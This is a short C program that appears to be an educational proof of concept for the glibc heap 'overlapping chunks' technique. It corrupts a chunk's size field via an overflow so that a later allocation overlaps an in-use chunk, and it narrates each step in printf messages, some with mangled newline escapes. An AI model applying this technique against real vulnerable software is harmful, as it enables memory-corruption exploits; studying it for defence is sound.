#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <malloc.h>
int main(){
  void *p1,*p2,*p3,*p4,*p5,*p6;
  unsigned int real_size_p1,real_size_p2,real_size_p3,real_size_p4,real_size_p5,real_size_p6;
  int prev_in_use = 0x1;

  p1 = malloc(1000);
  p2 = malloc(1000);
  p3 = malloc(1000);
  p4 = malloc(1000);
  p5 = malloc(1000);
  real_size_p1 = malloc_usable_size(p1);
  real_size_p2 = malloc_usable_size(p2);
  real_size_p3 = malloc_usable_size(p3);
  real_size_p4 = malloc_usable_size(p4);
  real_size_p5 = malloc_usable_size(p5);

  printf("\nchunk p1 from %p to %p", p1, (unsigned char *)p1+malloc_usable_size(p1));
  printf("\nchunk p2 from %p to %p", p2,  (unsigned char *)p2+malloc_usable_size(p2));
  printf("\nchunk p3 from %p to %p", p3,  (unsigned char *)p3+malloc_usable_size(p3));
  printf("\nchunk p4 from %p to %p", p4, (unsigned char *)p4+malloc_usable_size(p4));
  printf("\nchunk p5 from %p to %p\n", p5,  (unsigned char *)p5+malloc_usable_size(p5));

  memset(p1,'A',real_size_p1);
  memset(p2,'B',real_size_p2);
  memset(p3,'C',real_size_p3);
  memset(p4,'D',real_size_p4);
  memset(p5,'E',real_size_p5);
 
  printf("\nLet's free the chunk p4.nIn this case this isn't coealesced with top chunk since we have p5 bordering top chunk after p4\n"); 

//  free(p4);

  printf("nLet's trigger the vulnerability on chunk p1 that overwrites the size of the in use chunk p2nwith the size of chunk_p2 + size of chunk_p3\n");

  *(unsigned int *)((unsigned char *)p1 + real_size_p1 ) = real_size_p2 + real_size_p3 + prev_in_use + sizeof(size_t) * 2; //<--- BUG HERE 

  printf("nNow during the free() operation on p2, the allocator is fooled to think that nthe nextchunk is p4 ( since p2 + size_p2 now point to p4 ) \n");
  printf("nThis operation will basically create a big free chunk that wrongly includes p3\n");
  free(p2);
  printf("nNow let's allocate a new chunk with a size that can be satisfied by the previously freed chunk\n");

  p6 = malloc(2000);
  real_size_p6 = malloc_usable_size(p6);

  printf("nOur malloc() has been satisfied by our crafted big free chunk, now p6 and p3 are overlapping and nwe can overwrite data in p3 by writing on chunk p6\n");
  printf("\nchunk p6 from %p to %p", p6,  (unsigned char *)p6+real_size_p6);
  printf("\nchunk p3 from %p to %p\n", p3, (unsigned char *) p3+real_size_p3); 

  printf("\nData inside chunk p3: n\n");
  printf("%s\n",(char *)p3); 

  printf("\nLet's write something inside p6\n");
  memset(p6,'F',1500);  

  printf("\nData inside chunk p3: n\n");
  printf("%s\n",(char *)p3); 

}